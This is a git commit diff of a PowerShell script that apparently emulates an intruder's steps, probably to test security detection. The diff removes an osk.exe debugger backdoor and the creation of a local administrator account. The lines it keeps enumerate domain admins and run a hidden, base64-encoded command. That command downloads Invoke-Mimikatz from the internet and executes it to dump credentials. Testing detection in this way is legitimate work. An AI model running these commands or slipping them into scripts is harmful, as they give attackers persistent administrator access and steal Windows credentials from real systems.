c35f48daa3c805d51bf58180d84101b0afe8ea0a
apmunch <andrew.munchbach@crowdstrike.com>
2019-03-15 09:02:50 -0400

    Update work.ps1

--- work.ps1
+++ work.ps1
@@ -4,12 +4,6 @@ cmd.exe /c "ping -n 1 8.8.8.8"
 Start-Sleep -s 2
 cmd.exe /c "net group "Domain Admins" /domain
 Start-Sleep -s 2
-cmd.exe /c "reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "cmd.exe" /f"
-Start-Sleep -s 2
-cmd.exe /c "net user rickflair natureb0y /add"
-Start-Sleep -s 2
-cmd.exe /c "net localgroup Administrators rickflair /add"
-Start-Sleep -s 2
 cmd.exe /c "tracert -d nasa.xxuz.com"
 Start-Sleep -s 2
 cmd.exe /c "powershell -windowStyle Hidden -ExecutionPolicy Bypass -encodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBsAHkAbQBiADMAcgAvAFAAbwB3AGUAcgBTAGgAZQBsAGwALwBtAGEAcwB0AGUAcgAvAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6AC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAnACkAOwAgAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6AA=="
